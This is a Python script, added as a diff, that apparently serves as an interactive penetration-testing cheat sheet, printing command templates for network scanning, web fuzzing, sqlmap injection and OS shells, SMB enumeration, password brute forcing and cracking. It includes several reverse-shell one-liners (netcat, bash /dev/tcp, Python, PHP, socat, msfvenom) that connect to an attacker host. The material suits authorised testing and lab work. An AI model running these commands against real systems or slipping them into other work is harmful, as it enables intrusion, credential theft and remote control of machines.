@@ -1,0 +1,433 @@
+#!/usr/bin/python3
+"""
+Interactive command generator for https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg
+"""
+
+# by wildcard name
+# by block 
+# by service
+# by port (winrm)
+# by tool
+# by tags
+
+# use tags
+# show following paths
+
+import readline
+import sys
+import os
+from pprint import pprint
+import pdb
+
+class Hint:
+    mode = 'verbose'
+    known_modes = ('command', 'verbose')
+    match_conditions = {
+        'name': lambda lvalue, hint: lvalue in hint.name.lower(),
+        'command': lambda lvalue, hint: lvalue in hint.command.lower(),
+        'block': lambda lvalue, hint: lvalue in hint.block.lower(),
+        'service': lambda lvalue, hint: lvalue == hint.service.lower(),
+        'ports': lambda lvalue, hint: lvalue in hint.ports,
+        'tool': lambda lvalue, hint: lvalue == hint.tool.lower(),
+        'tags': lambda lvalue, hint: lvalue in [x.lower() for x in hint.tags],
+        'comment': lambda lvalue, hint: lvalue in hint.comment.lower(),
+        'next_step': lambda lvalue, hint: lvalue in hint.next_step.lower(),
+    }
+
+    def add_known(command, values):
+        for k,v in values.items():
+            if v:
+                command = command.replace('{'+k+'}', v)
+        return command
+
+    def __init__(self, name, command, block, service, ports, tool, tags='', comment='', next_step=''):
+        self.name = name or ''
+        self.command = command or ''
+        self.block = block
+        self.service = service or ''
+        self.ports = str(ports or '').split(' ')
+        self.tool = tool or ''
+        self.tags = list(filter(None, (tags or '').split(' ')))
+        self.comment = comment or ''
+        self.next_step = next_step or ''
+
+    def matches(self, values, strict_match=None):
+        #if self.name == 'MS14-068':
+        #    pdb.set_trace()
+
+        if 'all' in values:
+            return True
+
+        current_conditions = [v for k,v in Hint.match_conditions.items() if (not strict_match or k == strict_match)]
+
+        for value in values:
+            match = False
+            lvalue = value.lower()
+
+            if not any([cc(lvalue, self) for cc in current_conditions]):
+                return False
+        return True
+
+    def __str__(self):
+        global intel, formatting
+
+        command = Hint.add_known(self.command, intel)
+        if not command.strip():
+            command = '-'
+        if Hint.mode == 'command':
+            return command
+
+        else: # verbose
+            result = ''
+            if formatting.get('last_block') != self.block:
+                result += f'\n\033[33m[{self.block}]\033[0m\n'
+            if formatting.get('last_name') != self.name:
+                result += f'\n\033[32m{self.name}:\033[0m\n'
+
+            #comment_nextstep = self.comment if self.comment else ""
+            comment_nextstep = ""
+            if self.next_step:
+                comment_nextstep += f" -> {self.next_step}"
+            if comment_nextstep:
+                comment_nextstep += ';'
+
+            ports = '/'.join(self.ports)
+            service_ports = ', '.join(filter(None, [self.service, ports or None]))
+            if service_ports:
+                service_ports = f'({service_ports}),'
+
+            tags = []
+            for tag in self.tags:
+                if tag == 'dangerous':
+                    tags.append(f'\033[31m{tag}\033[94m')
+                else:
+                    tags.append(tag)
+            if self.tool and self.tool not in tags:
+                tags.insert(0, f'\033[92m{self.tool}\033[94m')
+            tags = f'[{", ".join(tags)}]'
+
+            if len(command) < 80 and False:
+                result += f"  {command.ljust(80)}   \033[94m# {comment_nextstep} {service_ports} {tags}\033[0m"
+            else: 
+                #result += f"  \033[94m# {comment_nextstep} {service_ports} {tags}\033[0m\n  {command}"
+                result += f"  \033[94m# {comment_nextstep} {service_ports} {tags}\033[0m\n"
+                if self.comment:
+                    result += f'  \033[94m# {self.comment}\033[0m\n'
+                result += f"  {command}\n"
+            
+            formatting['last_block'] = self.block
+            formatting['last_name'] = self.name
+            return result
+
+hints = [
+    
+    # No credentials
+    
+    #Hint(name='Scan network', command='cme smb {subnet}', block='no credentials', service='SMB', ports='445', 
+    #    tool='crackmapexec', tags='', comment='enumerate smb hosts', next_step=''),
+    #Hint(name='Scan network', command='nmap -sP -p {ip}', block='no credentials', service='ICMP', ports=None, 
+    #    tool='nmap', tags='', comment='ping scan', next_step='find vulnerable host'),
+    #Hint(name='Scan network', command='nmap -PN -sV --top-ports 50 --open {ip}', block='no credentials', service=None, ports=None, 
+    #    tool='nmap', tags='', comment='quick scan', next_step='find vulnerable host'),
+    #Hint(name='Scan network', command='nmap -PN --script smb-vuln* -p139,445 {ip}', block='no credentials', service='SMB', ports='139 445', 
+    #    tool='nmap', tags='', comment='search smb vuln', next_step='find vulnerable host'),
+    #Hint(name='Scan network', command='nmap -PN -sC -sV -oA {output} {ip}', block='no credentials', service=None, ports=None, 
+    #    tool='nmap', tags='', comment='classic scan', next_step='find vulnerable host'),
+    #Hint(name='Scan network', command='nmap -PN -sC -sV -p- -oA {output} {ip}', block='no credentials', service=None, ports=None, 
+    #    tool='nmap', tags='', comment='full scan', next_step='find vulnerable host'),
+    #Hint(name='Scan network', command='nmap -PN -sU -sC -sV -p- -oA {output} {ip}', block='no credentials', service=None, ports=None, 
+    #    tool='nmap', tags='UDP', comment='UDP scan', next_step='find vulnerable host'),
+
+    #Hint(name='Find DC IP', command='nmcli dev show {interface}', block='no credentials', service=None, ports=None, 
+    #    tool=None, tags='', comment='show domain name & DNS', next_step=None),
+    #Hint(name='Find DC IP', command='nslookup -type=SRV _ldap._tcp.dc._msdcs.{domain}', block='no credentials', service='DNS', ports=53, 
+    #    tool='nslookup', tags='', comment='', next_step=None),
+
+    #Hint(name='zone transfer', command='dig axfr {domain} @{ip}', block='no credentials', service='DNS', ports=53, 
+    #    tool='dig', tags='', comment='', next_step=None), # originally @{name_server}
+    
+
+    # network scan
+    Hint(name='Scan network', command='sudo masscan -p0-65535 --adapter {if} --rate=5000 {ip} --wait 1', block='network scan', service='', ports='', 
+        tool='masscan', tags='loud', comment='fast check all TCP ports', next_step=''),
+    Hint(name='Scan network', command='nmap -n -Pn -T4 -v -p- --min-rate=5000 --max-retries=1 --open {ip}', block='network scan', service='', ports='', 
+        tool='nmap', tags='loud', comment='fast check all TCP ports', next_step=''),
+    Hint(name='Scan network', command='sudo nmap -n -T4 --max-rtt-timeout 100ms --max-retries 1 -Pn -sSVC -O -oN output/nmap {ip} -p {ports}', block='network scan', service='', ports='', 
+        tool='nmap', tags='loud', comment='service and OS detection (at least 1 open and 1 closed port should be given)', next_step=''),
+    Hint(name='Scan network', command='nmap -n -T4 --max-rtt-timeout 100ms --max-retries 1 -Pn -sC --script vuln {ip} -p {ports}', block='network scan', service='', ports='', 
+        tool='nmap', tags='loud', comment='run vulnerability scan', next_step=''),
+
+
+    # vulnerability search
+    Hint(name='Search for exploit', command='searchsploit {keywords}', block='vulnerability search', service='', ports='', 
+        tool='searchsploit', tags='passive', comment='', next_step=''),
+    Hint(name='Search for CVE', command='LFcves software.txt | tee output/cves', block='vulnerability search', service='', ports='', 
+        tool='LF', tags='passive', comment='search by CVE, CPE or keywords', next_step=''),
+    Hint(name='Search for CVE', command='LFcves cpe:2.3:o:linux:linux_kernel:2.6', block='vulnerability search', service='', ports='', 
+        tool='LF', tags='passive', comment='linux kernel', next_step=''),
+    Hint(name='Search for CVE', command='LFcves cpe:2.3:o:microsoft:windows_7:-:sp1:*:*:professional:*:x64:*', block='vulnerability search', service='', ports='', 
+        tool='LF', tags='passive', comment='windows', next_step=''),
+    
+
+    # website enumeration
+    Hint(name='Web fuzzing', command='ffuf -c -u http://{domain}/FUZZ -w {directories_dict}:FUZZ -recursion -e .txt,.gz,{extension}', block='website enumeration', service='HTTP', ports='80 443', 
+        tool='ffuf', tags='loud', comment='find files on domain', next_step=''),
+    Hint(name='Web fuzzing', command='ffuf -c -u http://{domain} -H "Host: FUZZ.{domain}" -w {subdomains_dict}:FUZZ -ac', block='website enumeration', service='HTTP', ports='80 443', 
+        tool='ffuf', tags='loud', comment='find subdomains on same machine', next_step=''),
+    Hint(name='Web fuzzing', command='''ffuf -c -w {vectors_dict} -request-proto http -request {request_file}''', block='website enumeration', service='HTTP', ports='80 443', 
+        tool='ffuf', tags='loud', comment='ffuf with request file', next_step=''),
+    Hint(name='Web fuzzing', command='''ffuf -c -w {vectors_dict} -u http://{domain}/?{param}=FUZZ''', block='website enumeration', service='HTTP', ports='80 443', 
+        tool='ffuf', tags='loud', comment='bruteforce GET data', next_step=''),
+    Hint(name='Web fuzzing', command='''ffuf -c -w {vectors_dict} -u http://{domain}/ -X POST -H "Content-Type: application/json" -d '{"data":"FUZZ"}' ''', block='website enumeration', service='HTTP', ports='80 443', 
+        tool='ffuf', tags='loud', comment='bruteforce POST data', next_step=''),
+    Hint(name='Web fuzzing', command='''ffuf -c -w {file1}:FUZZ -w {file2}:FUZ2Z -u http://{domain}/?FUZZ=FUZ2Z''', block='website enumeration', service='HTTP', ports='80 443', 
+        tool='ffuf', tags='loud', comment='multiple value fuzzing', next_step=''),
+
+    Hint(name='Web info gathering', command='''whatweb http://{domain}''', block='website enumeration', service='HTTP', ports='80 443', 
+        tool='whatweb', tags='', comment='', next_step=''),
+
+    Hint(name='Wordpress enumeration', command='''wpscan --url http://{domain} -t 16 -o output/wpscan''', block='website enumeration', service='HTTP', ports='80 443', 
+        tool='wpscan', tags='', comment='', next_step=''),
+    Hint(name='Wordpress enumeration', command='''wpscan --url http://{domain} --detection-mode passive -t 16 -o output/wpscan''', block='website enumeration', service='HTTP', ports='80 443', 
+        tool='wpscan', tags='passive', comment='passive only', next_step=''),
+    Hint(name='Wordpress enumeration', command='''wpscan --url http://{domain} --api-token {wpvulndb_token} -t 16 -o output/wpscan''', block='website enumeration', service='HTTP', ports='80 443', 
+        tool='wpscan', tags='', comment='', next_step=''),
+
+    # SQLmap
+    Hint(name='SQLmap', command='''sqlmap -u http://{domain}''', block='website enumeration', service='HTTP', ports='80 443', 
+        tool='sqlmap', tags='loud', comment='simple guided execution', next_step=''),
+    Hint(name='SQLmap', command='''sqlmap -u http://{domain}/id=*''', block='website enumeration', service='HTTP', ports='80 443', 
+        tool='sqlmap', tags='loud', comment='specific injection', next_step=''),
+    Hint(name='SQLmap', command='''sqlmap -r {request_file} --dbs''', block='website enumeration', service='HTTP', ports='80 443', 
+        tool='sqlmap', tags='loud', comment='from request template', next_step=''),
+    Hint(name='SQLmap', command='''sqlmap -r {request_file} --dbs --tamper="between,randomcase"''', block='website enumeration', service='HTTP', ports='80 443', 
+        tool='sqlmap', tags='loud', comment='use anti-WAF techniques, `sqlmap --list-tamper` for more', next_step=''),
+    Hint(name='SQLmap', command='''sqlmap -r {request_file} -D mysql -T user -C user,host,authentication_string --dump''', block='website enumeration', service='HTTP', ports='80 443', 
+        tool='sqlmap', tags='loud', comment='dump DB credentials', next_step=''),
+    Hint(name='SQLmap', command='''sqlmap -r {request_file} --os-shell''', block='website enumeration', service='HTTP', ports='80 443', 
+        tool='sqlmap', tags='loud', comment='get shell', next_step=''),
+
+    # common services
+    # SMB
+    Hint(name='List null session access on samba share', command='enum4linux -a -u "" -p "" {ip}', block='common services', service='SMB', ports=445,
+            tool='enum4linux', tags='', comment='', next_step=None),
+    Hint(name='List null session access on samba share', command='smbmap -u "" -p "" -P 445 -H {ip}', block='common services', service='SMB', ports=445,
+        tool='smbmap', tags='', comment='', next_step=None),
+    Hint(name='List null session access on samba share', command='smbclient -U "%" -L //{ip}', block='common services', service='SMB', ports=445,
+        tool='smbclient', tags='', comment='', next_step=None),
+    Hint(name='List null session access on samba share', command='cme smb {ip} -u "" -p ""', block='common services', service='SMB', ports=445,
+        tool='crackmapexec', tags='', comment='enumerate null session', next_step=None),
+    Hint(name='List guest access on samba share', command='enum4linux -a -u "guest" -p "" {ip}', block='common services', service='SMB', ports=445,
+        tool='enum4linux', tags='', comment='', next_step=None),
+    Hint(name='List guest access on samba share', command='smbmap -u "guest" -p "" -P 445 -H {ip}', block='common services', service='SMB', ports=445,
+        tool='smbmap', tags='', comment='', next_step=None),
+    Hint(name='List guest access on samba share', command='smbclient -U "guest" -L //{ip}', block='common services', service='SMB', ports=445,
+        tool='smbclient', tags='', comment='', next_step=None),
+    Hint(name='List guest access on samba share', command='cme smb {ip} -u "guest" -p ""', block='common services', service='SMB', ports=445,
+        tool='crackmapexec', tags='', comment='enumerate anonymous access', next_step=None),
+    Hint(name='Connect to samba shared directory', command='smbclient //{ip}/{dir}', block='common services', service='SMB', ports=445,
+        tool='smbclient', tags='', comment='`prompt off; recurse on; mget *` to download everything', next_step=None),
+    # NFS
+    Hint(name='Enumerate NFS', command='nmap --script nfs-ls,nfs-showmount,nfs-statfs {ip}', block='common services', service='NFS', ports=2049,
+        tool='nmap', tags='', comment='', next_step=None),
+    Hint(name='Enumerate NFS', command='showmount -e {ip}', block='common services', service='NFS', ports=2049,
+        tool='nmap', tags='', comment='', next_step=None),
+
+    # shells
+    Hint(name='Reverse shell', command='nc {lhost} 55555 -e /bin/bash', block='shell', service='', ports='', 
+        tool='nc', tags='', comment='', next_step=''),
+    Hint(name='Reverse shell', command='rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {lhost} 55555 > /tmp/f', block='shell', service='', ports='', 
+        tool='nc', tags='', comment='', next_step=''),
+    Hint(name='Reverse shell', command="""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",55555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""", block='shell', service='', ports='', 
+        tool='python3', tags='', comment='', next_step=''),
+    Hint(name='Reverse shell', command="""php -r '$sock=fsockopen("{lhost}", 55555);exec("/bin/sh -i <&3 >&3 2>&3");'""", block='shell', service='', ports='', 
+        tool='php', tags='', comment='', next_step=''),
+    Hint(name='Reverse shell', command='bash -i >& /dev/tcp/{lhost}/55555 0>&1', block='shell', service='', ports='', 
+        tool='bash', tags='', comment='', next_step=''),
+    Hint(name='Reverse shell', command='''socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:55555''', block='shell', service='', ports='', 
+        tool='socat', tags='', comment='fully functional, use with "socat file:`tty`,raw,echo=0 tcp-listen:55555" on attacker machine', next_step=''),
+    Hint(name='Reverse shell', command='msfvenom -p windows/shell/reverse_tcp LHOST={lhost} LPORT=4444 EXITFUNC=thread -f exe -a x64 --platform windows -o exploit.exe', block='shell', service='', ports='', 
+        tool='msfvenom', tags='passive', comment='Windows reverse shell', next_step=''),
+    
+    # passwords
+    Hint(name='Hydra SSH', command='hydra -t 4 -L {users_dict} -P {passwords_dict} {ip} ssh', block='passwords', service='SSH', ports='22', 
+        tool='hydra', tags='loud', comment='SSH credential bruteforce', next_step=''),
+    Hint(name='Hydra SSH', command='hydra -w 3 -W 3 -t 1 -u -L {users_dict} -P {passwords_dict} -v -o output/hydrated {ip} ssh', block='passwords', service='SSH', ports='22', 
+        tool='hydra', tags='loud', comment='SSH bruteforce, attempt every 3s, rotate users first', next_step=''),
+    Hint(name='Hydra SSH', command='hydra -L {users_dict} -P {passwords_dict} {ip} http-get {path}', block='passwords', service='HTTP', ports='80 443', 
+        tool='hydra', tags='loud', comment='HTTP Basic auth bruteforce', next_step=''),
+    Hint(name='Hydra SSH', command='hydra -L {users_dict} -P {passwords_dict} {ip} http-post-form "{path}:{post_data(^USER^_^PASS^)}:{error_message}"', block='passwords', service='HTTP', ports='80 443',
+        tool='hydra', tags='loud', comment='HTTP POST bruteforce', next_step=''),
+
+    Hint(name='Hash ID', command='hashid {hashes_list}', block='passwords', service='', ports='', 
+        tool='hashid', tags='passive', comment='', next_step=''),
+
+    Hint(name='CeWL', command='cewl -w {result_file} -m 5 -d 4 --with-numbers {url}', block='passwords', service='HTTP', ports='80 443', 
+        tool='cewl', tags='loud', comment='spider web page, compile wordlist', next_step=''),
+    Hint(name='CeWL', command='cewl -n -e --email_file {result_file} {url}', block='passwords', service='HTTP', ports='80 443', 
+        tool='cewl', tags='loud', comment='collect e-mail addresses', next_step=''),
+
+    Hint(name='Hashcat', command='hashcat -O -m 10000 {hashes_list} {passwords_dict}', block='passwords', service='', ports='', 
+        tool='hashcat', tags='cracking passive', comment='PBKDF2; find other at https://hashcat.net/wiki/doku.php?id=example_hashes', next_step=''),
+
+    Hint(name='John', command='john --incremental:Alnum -min-len:8 -max-len:8 {hashes_list}', block='passwords', service='', ports='', 
+        tool='john', tags='cracking passive', comment='bruteforce certain length', next_step=''),
+    Hint(name='John', command='john --incremental:Alnum --stdout -min-len:8 -max-len:8 | aircrack-ng -w - -b {bssid} {pcap_file}', block='passwords', service='', ports='', 
+        tool='john', tags='cracking passive', comment='bruteforce WPA', next_step=''),
+    Hint(name='John', command='john --format={hash_format} --wordlist={passwords_file} {hashes_list}', block='passwords', service='', ports='', 
+        tool='john', tags='cracking passive', comment='dictionary attack', next_step=''),
+    
+    Hint(name='John format', command='ssh2john {ssh_encrypted_key} >> {hashes_list}', block='passwords', service='', ports='', 
+        tool='john', tags='cracking passive', comment='prepare SSH private key for cracking', next_step=''),
+
+    # Steganography
+    Hint(name='Steganography detection', command='steghide --info {file}', block='Steganography', service='', ports='', 
+        tool='steghide', tags='steganography passive', comment='', next_step=''),
+
+    # cheatsheet
+    Hint(name='Hacktricks', command='https://book.hacktricks.xyz/', block='cheatsheet', service='', ports='', 
+        tool='', tags='passive', comment='guides to pentest various targets', next_step=''),
+    Hint(name='Hashcat', command='https://hashcat.net/wiki/doku.php?id=example_hashes', block='cheatsheet', service='', ports='', 
+        tool='hashcat', tags='cracking passive passwords', comment='example hashes', next_step=''),
+    Hint(name='Hashcat', command='https://hashcat.net/wiki/doku.php?id=rule_based_attack', block='cheatsheet', service='', ports='', 
+        tool='hashcat', tags='cracking passive passwords', comment='rules', next_step=''),
+
+    # TODO
+    # nc
+    # socat - local, remote (htb - antique)
+    # SSH port forward
+    # passwords:
+    #   hashcat, also see htb - perfection
+    #   jtr
+    # web:
+    #   LFhtml
+    #   get versions of web frameworks and cms's
+    #   various curl, curl_raw
+    #   various wget
+    #   webdav - Broker.pdf writeup
+    # reverse shells
+    # fix pty (https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-1-python-pty-module)
+    # run even after pty closes
+    # msfconsole
+    # cheatsheets - gtfobins, wadcoms, lolbas, wildcards spare tricks
+    # dns - dig
+    # ldap - ldapsearch
+    # smb - smbclient, enum4linux, 
+    # find - writable, ...
+    # getcap -r / 2> /dev/null
+    # wifi
+    #   reaver (htb - wifinetic)
+    #   kismet
+    #   aircrack-ng
+    # msfvenom
+    # binwalk
+    # sleuthkit
+    # steghide
+    # john format conversions
+    # rpc - grpc, grpcurl
+    # servers (python3 -m http.server, php -S, ..., samba)
+    # snmp # snmpwalk -v2c -c public $domain
+
+
+]
+
+intel = {
+    'users_dict': 'users.txt', 
+    'hashes_list': 'hashes.txt', 
+    'passwords_dict': 'passwords.txt',
+    'directories_dict': 'wordlists/directories',
+    'subdomains_dict': 'wordlists/subdomains',
+    'vectors_dict': 'wordlists/weber/all_urle.txt',
+    'wpvulndb_token': '$(cat tokens/wpvulndb)',
+}
+for k in ('ip', 'domain', 'if', 'lhost'):
+    try:
+        intel[k] = os.environ.get(k)
+    except:
+        continue
+        
+formatting = {}
+
+while True:
+    strict_match = None
+
+    print('\033[35m', end='')
+    try:
+        cmd = input('?) ').strip()
+    except EOFError:  # Ctrl+D -> quit
+        sys.exit(1)
+    print('\033[0m', end='')
+    if len(cmd) == 0:
+        continue
+    # quit?
+    if cmd in ['q', 'quit', 'exit']:
+        sys.exit(0)
+    # help
+    elif cmd in ['help']:
+        # TODO help
+        print('')
+
+    # strict match for block (TODO more?)
+    elif cmd.startswith('block '):
+        strict_match = 'block'
+        cmd = cmd[6:]
+
+    # list of X # TODO counts?
+    if cmd in ['blocks', 'tags', 'tools', 'services', 'ports']:
+        uniq = []
+        if cmd in ['blocks', 'tools', 'services']:
+            cmd = cmd[:-1]
+        for h in hints:
+            a = getattr(h, cmd)
+            if isinstance(a, list):
+                for x in a:
+                    uniq.append(x)
+            else:
+                uniq.append(a)
+        uniq = list(dict.fromkeys(uniq))
+        if cmd != 'block':
+            #print(uniq)
+            uniq = sorted(filter(None, uniq), key=lambda x: int(x) if x.isdigit() else x.lower())
+        for x in uniq:
+            print(x)
+
+        
+    # do command
+    else:
+        formatting = {}
+        # assign intel?
+        k, eq, v = cmd.partition(' = ')
+        if eq == ' = ': 
+            if v:
+                intel[k.strip()] = v.strip()
+                continue
+            else:
+                try:
+                    del intel[k.strip()]
+                except:
+                    pass
+                continue
+
+        # print intel?
+        if cmd.strip() == 'intel':
+            pprint(intel)
+
+        # set mode?
+        m, _, w = cmd.partition(' ') 
+        w = w.strip()
+        if m == 'mode' and w:
+            if w in Hint.known_modes:
+                Hint.mode = w
+            else:
+                print('Invalid mode.', file=sys.stderr)
+        
+        # find what needed
+        for hint in hints:
+            if hint.matches(cmd.split(), strict_match):
+                print(hint)
+
+
+
+
+
+
